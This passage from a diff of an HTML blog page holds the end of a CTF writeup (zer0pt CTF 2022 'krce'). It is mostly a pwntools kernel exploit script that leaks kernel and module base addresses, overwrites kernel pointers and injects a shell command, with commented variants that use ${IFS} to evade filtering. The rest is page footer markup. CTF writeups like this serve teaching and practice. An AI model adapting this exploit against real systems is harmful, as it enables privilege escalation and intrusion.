delete&quot;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">show(<span class="number">0xffffffe6</span>, <span class="number">0x100</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;[+] Data: &quot;</span>)</span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">    s.append(p.recv(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">s = <span class="string">b&quot;&quot;</span>.join(s)</span><br><span class="line">s = s.split(<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment"># s = [int(x, 16) for x in s]</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">leak = []</span><br><span class="line"><span class="keyword">while</span>(i &lt; <span class="built_in">len</span>(s)):</span><br><span class="line">    x = <span class="string">b&quot;&quot;</span>.join(s[i:i+<span class="number">8</span>][::-<span class="number">1</span>])</span><br><span class="line">    leak.append(<span class="built_in">int</span>(x, <span class="number">16</span>))</span><br><span class="line">    i+=<span class="number">8</span></span><br><span class="line"></span><br><span class="line">mod_base = leak[<span class="number">0</span>]- <span class="number">0x2330</span></span><br><span class="line">kernel_base = leak[<span class="number">2</span>] - <span class="number">0xeb47b0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] mod_base: 0x%x&quot;</span> % mod_base)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] kernel_base: 0x%x&quot;</span> % kernel_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">0xffffffe9</span>, <span class="number">0x200</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;[+] Data: &quot;</span>)</span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400</span>):</span><br><span class="line">    s.append(p.recv(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">s = <span class="string">b&quot;&quot;</span>.join(s)</span><br><span class="line">s = s.split(<span class="string">b&#x27; &#x27;</span>)</span><br><span class="line"><span class="comment"># s = [int(x, 16) for x in s]</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">leak = []</span><br><span class="line"><span class="keyword">while</span>(i &lt; <span class="built_in">len</span>(s)):</span><br><span class="line">    x = <span class="string">b&quot;&quot;</span>.join(s[i:i+<span class="number">8</span>][::-<span class="number">1</span>])</span><br><span class="line">    leak.append(<span class="built_in">int</span>(x, <span class="number">16</span>))</span><br><span class="line">    i+=<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print([hex(i) for i in leak])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(len(leak))</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">b&#x27;&#x27;</span>.join(s)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(s[:22*8*2])</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addr_to_laji</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="comment"># return &quot;&quot;.join([hex(i)[2:] for i in p64(addr)]).encode()</span></span><br><span class="line">    <span class="keyword">return</span> codecs.encode(p64(addr),<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = s[:<span class="number">22</span>*<span class="number">8</span>*<span class="number">2</span>] + addr_to_laji(kernel_base + <span class="number">0xE37CC0</span>) + addr_to_laji(mod_base+<span class="number">0x2050</span>)</span><br><span class="line"><span class="comment"># payload = &quot;010203040506070809&quot;</span></span><br><span class="line"><span class="comment"># edit(0, len(payload)//2, payload)</span></span><br><span class="line">edit(<span class="number">0xffffffe9</span>, <span class="built_in">len</span>(payload) //<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = codecs.encode(b&#x27;/bin/sh -c \&quot;/bin/sh -i &lt;&gt; /dev/console &gt;&amp;0 2&gt;&amp;1\&quot;\x00&#x27;,&#x27;hex&#x27;)</span></span><br><span class="line"><span class="comment"># payload = codecs.encode(b&quot;/bin/ls -al /root&quot;,&#x27;hex&#x27;)</span></span><br><span class="line"><span class="comment"># payload = codecs.encode(b&#x27;/root/a.sh\x00&#x27;,&#x27;hex&#x27;)</span></span><br><span class="line"><span class="comment"># payload = codecs.encode(b&#x27;/bin/sh -c /bin/sh$&#123;IFS&#125;-i$&#123;IFS&#125;&lt;&gt;$&#123;IFS&#125;/dev/console$&#123;IFS&#125;&gt;&amp;0$&#123;IFS&#125;2&gt;&amp;1\x00&#x27;,&#x27;hex&#x27;)</span></span><br><span class="line"><span class="comment"># payload = codecs.encode(b&#x27;/bin/sh -c ls&gt;/dev/console\x00&#x27;,&#x27;hex&#x27;) # working</span></span><br><span class="line">payload = codecs.encode(<span class="string">b&#x27;/bin/sh -c sh&lt;/dev/console&gt;/dev/console\x00&#x27;</span>,<span class="string">&#x27;hex&#x27;</span>) <span class="comment"># working</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># after interactive, we (1) trigger a ioctl, (2) send a integer to make interface happy, and (3) kill it with sigstop so we have a persistant shell</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload) //<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = addr_to_laji(kernel_base + <span class="number">0x073240</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="built_in">len</span>(payload) //<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># we trigger ioctl manually</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>V1me
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://blog.imv1.me/2022/03/21/zer0pt-ctf-2022-krce-writeup/" title="zer0pt ctf 2022 krce writeup">http://blog.imv1.me/2022/03/21/zer0pt-ctf-2022-krce-writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/RoarCantProgram">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/Y3dramJzZw">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"><i class="fa fa-tag"></i> ctf</a>
+              <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+              <a href="/tags/kernel/" rel="tag"><i class="fa fa-tag"></i> kernel</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/12/28/asisctf-final-2021-rbtree-writeup/" rel="prev" title="asisctf final 2021 rbtree writeup">
+                  <i class="fa fa-angle-left"></i> asisctf final 2021 rbtree writeup
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/09/02/wdb-2022-xxker-writeup/" rel="next" title="网鼎杯 2022 xxker writeup">
+                  网鼎杯 2022 xxker writeup <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">V1me</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/Roarcannotprogramming" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/fancybox/fancybox.umd.js" integrity="sha256-+2+qOqR8CKoHh/AsVR9k2qaDBKWjYNC2nozhYmv5j9k=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
